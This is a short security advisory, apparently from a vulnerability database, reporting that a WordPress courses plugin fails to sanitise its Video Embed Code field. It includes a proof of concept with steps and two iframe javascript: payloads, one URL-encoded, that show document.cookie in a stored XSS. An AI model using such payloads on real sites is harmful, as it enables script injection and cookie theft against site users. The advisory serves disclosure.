# Description
The plugin does not sanitise its Video Embed Code, allowing malicious code to be injected in it by high privilege users, even when the unfiltered_html capability is disallowed, which could lead to Stored Cross-Site Scripting issues

# Proof of Concept
On the dashboard, navigate to `WP Courses > Courses > Add New > Video Embed Code (iframe) (in the Post settings)`, inject with `<iframe>` XSS payload, such as 

```text
<iframe src="javascript:alert(document.cookie)"></iframe>;<iframe src="javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29"></iframe>
```
Then, click `Update`, and to trigger XSS payload, open URL path of course
